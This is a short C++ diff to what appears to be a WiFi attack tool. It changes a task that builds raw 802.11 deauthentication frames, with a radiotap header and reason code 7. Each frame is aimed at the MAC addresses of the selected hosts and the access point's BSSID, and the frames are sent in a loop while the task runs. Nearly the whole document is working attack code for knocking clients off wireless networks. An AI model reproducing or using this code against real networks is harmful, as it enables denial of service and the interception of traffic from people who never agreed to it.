@@ -30,7 +30,7 @@ void ashk::tasks::DeauthPacketSendingTask::exec() {
         logger.log("couldn't open device");
         return;
     }
-    std::vector<pcpp::Packet>packets;
+
     uint8_t packet[]={
             // --- Radiotap Header ---
             0x00, 0x00,             // Radiotap version + pad
@@ -59,25 +59,27 @@ void ashk::tasks::DeauthPacketSendingTask::exec() {
             0x07, 0x00              // Reason code = 7 (class 3 error)
     };
 
-    for(auto i : *host_list){
-        if(i->is_selected){
-            auto pkt = new uint8_t[sizeof(packet)];
-            memcpy(pkt, packet, sizeof(packet));
 
-            memcpy(pkt + 16, i->mac.getRawData(), 6);
-            memcpy(pkt + 22, wifi_ap->b_ssid.getRawData(), 6);
-            memcpy(pkt + 28, wifi_ap->b_ssid.getRawData(), 6);
-
-            auto rawPacket=new pcpp::RawPacket(pkt, sizeof(packet), timeval{0, 0}, false);
-            packets.emplace_back(rawPacket);
-
-        }
-    }
 
 
 
 
     while (is_running()) {
+        std::vector<pcpp::Packet>packets;
+        for(auto i : *host_list){
+            if(i->is_selected){
+                auto pkt = new uint8_t[sizeof(packet)];
+                memcpy(pkt, packet, sizeof(packet));
+
+                memcpy(pkt + 16, i->mac.getRawData(), 6);
+                memcpy(pkt + 22, wifi_ap->b_ssid.getRawData(), 6);
+                memcpy(pkt + 28, wifi_ap->b_ssid.getRawData(), 6);
+
+                auto rawPacket=new pcpp::RawPacket(pkt, sizeof(packet), timeval{0, 0}, false);
+                packets.emplace_back(rawPacket);
+
+            }
+        }
         for (auto &i:packets) {
             dev_->sendPacket(&i);
         }
